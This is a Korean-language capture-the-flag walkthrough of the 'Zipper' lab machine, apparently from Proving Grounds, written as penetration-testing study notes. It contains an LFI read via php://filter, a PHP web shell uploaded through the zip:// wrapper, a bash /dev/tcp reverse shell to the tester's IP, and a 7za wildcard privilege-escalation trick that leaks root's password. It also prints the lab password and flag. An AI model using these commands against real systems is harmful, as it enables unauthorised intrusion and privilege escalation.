## 초기 열거
### Nmap
```bash
┌──(kali㉿kali)-[~/PG/Zipper]
└─$ nnmap 192.168.164.229
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-13 11:53 +0900
Nmap scan report for 192.168.164.229
Host is up (0.087s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Zipper
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   86.53 ms 192.168.45.1
2   86.51 ms 192.168.45.254
3   86.67 ms 192.168.251.1
4   86.72 ms 192.168.164.229

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.67 seconds
```

### Whatweb
```bash
┌──(kali㉿kali)-[~/PG/Zipper]
└─$ cat whatweb.txt
http://192.168.164.229 [200 OK] Apache[2.4.41], Bootstrap[4.0.0], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.164.229], Script, Title[Zipper]
```



### feroxbuster

index.php 발견
```bash
┌──(kali㉿kali)-[~/PG/Zipper]
└─$ feroxbuster -u http://192.168.164.229/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -x html,txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.164.229/
 🚩  In-Scope Url          │ 192.168.164.229
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [html, txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      320c http://192.168.164.229/uploads => http://192.168.164.229/uploads/
200      GET       76l      225w     3151c http://192.168.164.229/index.php
200      GET        8l       26w      155c http://192.168.164.229/style.css
200      GET       76l      225w     3151c http://192.168.164.229/
200      GET        8l       26w      155c http://192.168.164.229/style
[####################] - 19m  1245795/1245795 0s      found:5       errors:39
[####################] - 18m   622887/622887  562/s   http://192.168.164.229/
[####################] - 19m   622887/622887  561/s   http://192.168.164.229/uploads/ 
```

![[Pasted image 20260713154219.png]]



![[Pasted image 20260713154253.png]]



LFI기법 사용하여 base64로 추출 후  upload 소스코드 확보

![[Pasted image 20260713160249.png]]

http://192.168.164.229/index.php?file=php://filter/convert.base64-encode/resource=upload
```php
<?php
if ($_FILES && $_FILES['img']) {
    
    if (!empty($_FILES['img']['name'][0])) {
        
        $zip = new ZipArchive();
        $zip_name = getcwd() . "/uploads/upload_" . time() . ".zip";
        
        // Create a zip target
        if ($zip->open($zip_name, ZipArchive::CREATE) !== TRUE) {
            $error .= "Sorry ZIP creation is not working currently.<br/>";
        }
        
        $imageCount = count($_FILES['img']['name']);
        for($i=0;$i<$imageCount;$i++) {
        
            if ($_FILES['img']['tmp_name'][$i] == '') {
                continue;
            }
            $newname = date('YmdHis', time()) . mt_rand() . '.tmp';
            
            // Moving files to zip.
            $zip->addFromString($_FILES['img']['name'][$i], file_get_contents($_FILES['img']['tmp_name'][$i]));
            
            // moving files to the target folder.
            move_uploaded_file($_FILES['img']['tmp_name'][$i], './uploads/' . $newname);
        }
        $zip->close();
        
        // Create HTML Link option to download zip
        $success = basename($zip_name);
    } else {
        $error = '<strong>Error!! </strong> Please select a file.';
    }
}

```

업로드 된 파일은 압축되어 ./uploads/ 경로로 이동
웹쉘 생성 후 업로드 진행
```bash
┌──(kali㉿kali)-[~/PG/Zipper]
└─$ echo '<?php system($_GET["c"]); ?>' > shell.php

```

업로드 된 파일에 대한 시간 확보 후 웹쉘 테스트
```python
http://192.168.164.229/index.php?file=zip://uploads/upload_1783926987.zip%23shell&c=id
```

upload_1783926987.zip 웹쉘 실행

![[Pasted image 20260713161854.png]]


페이로드 작성 후 리버스 쉘 연결
```bash
┌──(kali㉿kali)-[~/PG/Zipper]
└─$ curl -G "http://192.168.103.229/index.php" \
  --data-urlencode "file=zip://uploads/upload_1783991346.zip#shell" \
  --data-urlencode "c=bash -c 'bash -i >& /dev/tcp/192.168.45.244/4444 0>&1'"
  
  
┌──(kali㉿kali)-[~/PG/Zipper]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.45.244] from (UNKNOWN) [192.168.103.229] 48642
bash: cannot set terminal process group (962): Inappropriate ioctl for device
bash: no job control in this shell
www-data@zipper:/var/www/html$ whoami
whoami
www-data
```

![[Pasted image 20260714103424.png]]
![[Pasted image 20260714103437.png]]

WEB 버전
```python
GET /index.php?file=zip://uploads/upload_1783991346.zip%23shell&c=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.244%2F4443%200%3E%261%27 HTTP/1.1
Host: 192.168.103.229
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Connection: keep-alive

```
![[Pasted image 20260714104154.png]]

flag 확인
![[Pasted image 20260714111529.png]]

linpeas.sh 실행하여 backup.sh 확인
![[Pasted image 20260714114748.png]]

backup.sh 내용 확인 시 7z 이용
`*.zip` 옵션은 파일명 목록으로 특정 이름의 파일이 데이터가 아니라 옵션/인자로 해석
```bash
www-data@zipper:/opt$ cat backup.sh
cat backup.sh
#!/bin/bash
password=`cat /root/secret`
cd /var/www/html/uploads
rm *.tmp
7za a /opt/backups/backup.zip -p$password -tzip *.zip > /opt/backups/backup.logwww-data@zipper:/opt$
```
![[Pasted image 20260714114834.png]]

`/var/www/html/uploads` 확인 후 touch로 @enox.zip 파일 생성
>/root/secret은 www-data가 **직접 못 읽습니다**(root 소유). 하지만 **root 크론이 7za를 root로 실행**하니까, 7za가 root 권한으로 /root/secret을 읽고 → `@enox.zip` 트릭 때문에 그 내용을 "없는 파일명"으로 에러 처리 → **www-data가 읽을 수 있는 로그에 비번을 뱉는** 겁니다. 즉 **root에게 대신 읽게 시키는** 거예요.
https://hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html#7-zip--7z--7za
![[Pasted image 20260714122358.png]]
```bash
www-data@zipper:/var/www/html/uploads$ touch @enox.zip
touch @enox.zip
www-data@zipper:/var/www/html/uploads$ ls -al
ls -al
total 20
drwxr-xr-x 2 www-data www-data 4096 Jul 14 03:11 .
drwxr-xr-x 3 www-data www-data 4096 Aug 12  2021 ..
-rw-r--r-- 1 www-data www-data   32 Aug 12  2021 .htaccess
-rw-r--r-- 1 www-data www-data    0 Jul 14 03:12 @enox.zip
lrwxrwxrwx 1 www-data www-data   12 Aug 12  2021 enox.zip -> /root/secret
-rw-r--r-- 1 www-data www-data  156 Aug 12  2021 upload_1628773085.zip
-rw-r--r-- 1 www-data www-data  144 Jul 14 01:09 upload_1783991346.zip
```
![[Pasted image 20260714121500.png]]

1분 후 패스워드 확인 `WildCardsGoingWild`
```bash
www-data@zipper:/opt/backups$ cat backup.log
cat backup.log

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,1 CPU AMD EPYC 7413 24-Core Processor                 (A00F11),ASM,AES-NI)

Open archive: /opt/backups/backup.zip
--
Path = /opt/backups/backup.zip
Type = zip
Physical Size = 892

Scanning the drive:
3 files, 319 bytes (1 KiB)

Updating archive: /opt/backups/backup.zip

Items to compress: 3


Files read from disk: 3
Archive size: 892 bytes (1 KiB)

Scan WARNINGS for files and folders:

WildCardsGoingWild : No more files
```

![[Pasted image 20260714121543.png]]

계정 변경 후 flag 확인
```bash
www-data@zipper:/var/www/html/uploads$ su -
su -
Password: WildCardsGoingWild
whoami
root
cat /root/proof.txt
f759ae397349838d362d2fc874892c17
```
![[Pasted image 20260714121708.png]]

